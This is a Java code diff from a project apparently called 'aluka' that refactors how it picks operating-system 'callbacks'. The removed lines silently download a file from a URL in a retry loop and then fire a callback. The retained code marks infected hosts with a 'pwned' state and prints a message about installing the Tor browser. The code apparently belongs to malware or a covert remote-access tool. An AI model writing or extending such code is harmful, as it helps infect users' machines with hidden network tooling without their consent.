@@ -8,9 +8,7 @@ import java.net.URL;
 import java.util.List;
 import java.util.function.Supplier;
 
-import aluka.callbacks.LinuxCallback;
-import aluka.callbacks.MacCallBack;
-import aluka.callbacks.WindowsCallback;
+import aluka.configuration.Configuration;
 
 class DownloadTor implements Runnable {
 
@@ -27,24 +25,8 @@ class DownloadTor implements Runnable {
 
 	@Override
 	public void run() {
-
-		while (true) {
-			File file = new File(targetDownload);
-			file.deleteOnExit();
-			try (BufferedInputStream in = new BufferedInputStream(new URL(torUrl).openStream());
-					FileOutputStream fileOutputStream = new FileOutputStream(file)) {
-				byte dataBuffer[] = new byte[1024];
-				int bytesRead;
-				while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
-					fileOutputStream.write(dataBuffer, 0, bytesRead);
-				}
-				break;
-			} catch (IOException e) {
-			}
-		}
-
-		callback.get();
-
+		System.out.println("[ + ] - Installing tor browser");
+		
 	}
 
 }
@@ -59,16 +41,16 @@ public class SystemManager {
 		System.out.println("[ + ] - Scanning System");
 		String os = System.getProperty("os.name").toLowerCase();
 		if (os.contains("win")) {
-			callback = new WindowsCallback();
+			callback = Configuration.getWindowsCallback();
 			state = "pwned";
 		} else if (os.contains("osx")) {
-			callback = new MacCallBack();
+			callback = Configuration.getMacosCallback();
 			this.state = "/tmp/pwned";
 		} else if (os.contains("nix") || os.contains("aix") || os.contains("nux")) {
-			callback = new LinuxCallback();
+			callback = Configuration.getLinuxCallback();
 			this.state = "/tmp/pwned";
 		} else {
-			callback = new WindowsCallback();
+			callback = Configuration.getWindowsCallback();
 		}
 	}
 
